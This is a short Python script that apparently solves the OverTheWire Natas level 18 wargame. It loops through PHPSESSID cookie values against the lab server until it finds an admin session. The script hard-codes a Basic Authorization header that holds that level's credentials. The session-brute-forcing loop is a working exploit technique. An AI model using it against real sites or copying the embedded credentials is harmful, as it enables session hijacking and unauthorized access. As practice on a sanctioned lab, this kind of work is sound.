"""
curl 'http://natas18.natas.labs.overthewire.org/index.php?debug' \
  -H 'Authorization: Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==' \
"""

import requests

MAX = 640
count = 1

u = "http://natas18.natas.labs.overthewire.org"
auth_header = {
    'Authorization': 'Basic bmF0YXMxODo2T0cxUGJLZFZqeUJscHhnRDRERGJSRzZaTGxDR2dDSg==',
}

while count <= MAX:
    sessionID = "PHPSESSID=" + str(count)
    print(sessionID)

    cookie = {"PHPSESSID": str(count)}
    response = requests.get(url=u, headers=auth_header, cookies=cookie)

    if "You are logged in as a regular user" not in response.text:
        print(response.text)
        break

    count += 1

print("Done!")
